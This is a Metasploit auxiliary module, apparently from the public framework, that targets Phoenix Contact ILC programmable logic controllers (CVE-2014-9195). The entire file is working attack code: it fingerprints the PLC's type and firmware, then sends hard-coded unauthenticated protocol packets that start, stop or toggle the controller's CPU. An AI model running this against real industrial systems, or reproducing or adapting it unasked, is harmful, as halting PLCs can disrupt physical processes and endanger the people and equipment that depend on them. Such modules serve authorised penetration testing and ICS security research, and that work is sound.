##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Rex::Socket::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'PhoenixContact PLC Remote START/STOP Command',
      'Version'       => '1',
      'Description'   => %q{
        PhoenixContact Programmable Logic Controllers are built upon a variant of
        ProConOS. Communicating using a proprietary protocol over ports TCP/1962
        and TCP/41100 or TCP/20547.
        It allows a remote user to read out the PLC Type, Firmware and
         Build number on port TCP/1962.
        And also to read out the CPU State (Running or Stopped) AND start
         or stop the CPU on port TCP/41100 (confirmed ILC 15x and 17x series)
         or on port TCP/20547 (confirmed ILC 39x series)
      },
      'Author'         => 'Tijl Deneut <tijl.deneut[at]howest.be>',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'https://github.com/tijldeneut/ICSSecurityScripts' ],
          [ 'CVE', '2014-9195']
        ],
      'DisclosureDate' => 'May 20 2015'))
    register_options(
      [
        OptEnum.new('ACTION', [true, 'PLC CPU action, REV means reverse current CPU state', 'NOOP',
          [
            'STOP',
            'START',
            'REV',
            'NOOP'
          ]]),
        OptPort.new('RINFOPORT', [true, 'Set info port', 1962 ]),
        OptPort.new('RPORT', [false, 'Set action port, will try autodetect when not set' ])
      ], self.class
    )
  end

  # Here comes the code, hang on to your pants
  def bin_to_hex(s)
    s.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
  end

  def hex_to_bin(s)
    s.scan(/../).map { |x| x.hex.chr }.join
  end

  def send_recv_once(data)
    buf = ''
    begin
      sock.put(data)
      buf = sock.get_once || ''
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    end

    bin_to_hex(buf)
  end

  def get_info(rhost, rport)
    connect(true, 'RHOST' => rhost, 'RPORT' => rport)
    data = send_recv_once("\x01\x01\x00\x1a\x00^\x00\x00\x00\x00\x00\x03\x00\x0cIBETH01N0_M\x00")
    if data.nil? || data.length < 36
      print_error("Could not obtain information on this device")
      disconnect
      return "UNKNOWN"
    end
    code = data[34..35]
    send_recv_once("\x01\x05\x00\x16\x00\x5f\x00\x00\x08\xef\x00" + hex_to_bin(code) + "\x00\x00\x00\x22\x00\x04\x02\x95\x00\x00")
    data = send_recv_once("\x01\x06\x00\x0e\x00\x61\x00\x00\x88\x11\x00" + hex_to_bin(code) + "\x04\x00")
    disconnect
    if data.nil? || data.length < 200
      print_error("Could not obtain information on this device")
      return "UNKNOWN"
    end
    plctype = hex_to_bin(data[60..99])
    print_status("PLC Type = " + plctype)
    print_status("Firmware = " + hex_to_bin(data[132..139]))
    print_status("Build    = " + hex_to_bin(data[158..174]) + " " + hex_to_bin(data[182..199]))
    print_status('------------------------------------')
    plctype
  end

  def init_phase1
    send_recv_once("\x01\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\xcf\xffAde.Remoting.Services.IProConOSControlService2\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00.\x00\x00\x00\x00\x00\x00\x00\x00\x00Ade.Remoting.Services.IProConOSControlService\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00)\x00\x00\x00\x00\x00\x00\x00\x00\x00Ade.Remoting.Services.IDataAccessService\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00*\x00\x00\x00\x00\x00\x00\x00\xd4\xffAde.Remoting.Services.IDeviceInfoService2\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00)\x00\x00\x00\x00\x00\x00\x00\x00\x00Ade.Remoting.Services.IDeviceInfoService\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00%\x00\x00\x00\x00\x00\x00\x00\xd9\xffAde.Remoting.Services.IForceService2\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00$\x00\x00\x00\x00\x00\x00\x00\x00\x00Ade.Remoting.Services.IForceService\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\xce\xffAde.Remoting.Services.ISimpleFileAccessService3\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00Ade.Remoting.Services.ISimpleFileAccessService2\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00*\x00\x00\x00\x00\x00\x00\x00\xd4\xffAde.Remoting.Services.IDeviceInfoService2\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00)\x00\x00\x00\x00\x00\x00\x00\x00\x00Ade.Remoting.Services.IDeviceInfoService\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00*\x00\x00\x00\x00\x00\x00\x00\xd4\xffAde.Remoting.Services.IDataAccessService3\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00)\x00\x00\x00\x00\x00\x00\x00\x00\x00Ade.Remoting.Services.IDataAccessService\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00*\x00\x00\x00\x00\x00\x00\x00\xd4\xffAde.Remoting.Services.IDataAccessService2\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00)\x00\x00\x00\x00\x00\x00\x00\xd5\xffAde.Remoting.Services.IBreakpointService\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\xd6\xffAde.Remoting.Services.ICallstackService\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00%\x00\x00\x00\x00\x00\x00\x00\x00\x00Ade.Remoting.Services.IDebugService2\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\xcf\xffAde.Remoting.Services.IProConOSControlService2\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x00.\x00\x00\x00\x00\x00\x00\x00\x00\x00Ade.Remoting.Services.IProConOSControlService\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\xce\xffAde.Remoting.Services.ISimpleFileAccessService3\x00")
    send_recv_once("\x01\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00Ade.Remoting.Services.ISimpleFileAccessService2\x00")
    send_recv_once("\x01\x00\x02\x00\x00\x00\x0e\x00\x03\x00\x03\x00\x00\x00\x00\x00\x05\x00\x00\x00\x12@\x13@\x13\x00\x11@\x12\x00")
  end

  def init_phase2
    send_recv_once("\xcc\x01\x00\r\xc0\x01\x00\x00\xd5\x17")
    send_recv_once("\xcc\x01\x00\x0b@\x02\x00\x00G\xee")
    send_recv_once("\xcc\x01\x00[@\x03\x1c\x00\x01\x00\x00\x00\x1c\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd7\x9a")
    send_recv_once("\xcc\x01\x00[@\x04\x1c\x00\x01\x00\x00\x00\x1c\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xeaC")
    send_recv_once("\xcc\x01\x00\x06@\x05\x00\x006\x1e")
    send_recv_once("\xcc\x01\x00\x07@\x06\x10\x00&u\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc6\x82")
  end

  def get_state1(data)
    if data[48..49] == '03'
      state = 'RUN'
    elsif data[48..49] == '07'
      state = 'STOP'
    elsif data[49..49] == '00'
      state = 'ON'
    else
      print_error('CPU State not detected, full result is ' + data)
      return
    end
    state
  end

  def get_state2(data)
    if data[16..17] == '04'
      state = 'STOP'
    elsif data[16..17] == '02'
      state = 'RUN'
    else
      print_error('CPU State not detected, full result is ' + data)
      return
    end
    state
  end

  def get_cpu(rhost, rport, devicetype)
    connect(true, 'RHOST' => rhost, 'RPORT' => rport)
    state = 'unknown'
    if devicetype == '15x'
      init_phase1
      ## KeepAlive packet
      send_recv_once("\x01\x00\x02\x00\x00\x00\x1c\x00\x03\x00\x03\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x07\x00\x05\x00\x06\x00\x08\x00\x10\x00\x02\x00\x11\x00\x0e\x00\x0f\x00\r\x00\x16@\x16\x00")
      ## Query packet
      data = send_recv_once("\x01\x00\x02\x00\x00\x00\x08\x00\x03\x00\x03\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x40\x0b\x40")
      state = get_state1(data)
    elsif devicetype == '39x'
      init_phase2
      data = send_recv_once("\xcc\x01\x00\x0f@\x07\x00\x00\xea\xfa")
      state = get_state2(data)
    end
    disconnect
    print_status('CPU Mode = ' + state)
    state
  end

  def set_cpu(rhost, rport, action, state, devicetype)
    connect(true, 'RHOST' => rhost, 'RPORT' => rport)
    if devicetype == '15x'
      init_phase1 ## Several packets (21)
      send_recv_once("\x01\x00\x02\x00\x00\x00\x1c\x00\x03\x00\x03\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x07\x00\x05\x00\x06\x00\x08\x00\x10\x00\x02\x00\x11\x00\x0e\x00\x0f\x00\r\x00\x16@\x16\x00")
      if action == 'START' || (action == 'REV' && state == 'STOP')
        print_status('--> Sending COLD start now')
        send_recv_once("\x01\x00\x02\x00\x00\x00\x02\x00\x01\x00\x06\x00\x00\x00\x00\x00\x01\x00")
      else
        print_status('--> Sending STOP now')
        send_recv_once("\x01\x00\x02\x00\x00\x00\x00\x00\x01\x00\x07\x00\x00\x00\x00\x00")
      end
    elsif devicetype == '39x'
      init_phase2 ## Several packets (6)
      if action == 'START' || (action == 'REV' && state == 'STOP')
        print_status('--> Sending COLD start now')
        send_recv_once("\xcc\x01\x00\x04\x40\x0e\x00\x00\x18\x21")
      else
        print_status('--> Sending STOP now')
        send_recv_once("\xcc\x01\x00\x01\x40\x0e\x00\x00\x4c\x07")
      end
    else
      print_error('Unknown device type')
      return
    end
    sleep(1) ## It takes a second for a PLC to start
    get_cpu(rhost, rport, devicetype)
    disconnect
  end

  def run
    rhost = datastore['RHOST']
    action = datastore['ACTION']
    ractionport = datastore['RPORT']

    device = get_info(rhost, datastore['RINFOPORT'])

    if device.start_with?('ILC 15', 'ILC 17')
      devicetype = '15x'
      print_status('--> Detected 15x/17x series, getting current CPU state:')
      ractionport.nil? ? (rport = 41100) : (rport = ractionport)
    elsif device.start_with?('ILC 39')
      devicetype = '39x'
      print_status('--> Detected 39x series, getting current CPU state:')
      ractionport.nil? ? (rport = 20547) : (rport = ractionport)
    else
      print_error('Only ILC and (some) RFC devices are supported.')
      return
    end

    state = get_cpu(rhost, rport, devicetype)
    print_status('------------------------------------')

    if action == "NOOP"
      print_status("--> No action specified (#{action}), stopping here")
      return
    end

    set_cpu(rhost, rport, action, state, devicetype)
  end
end
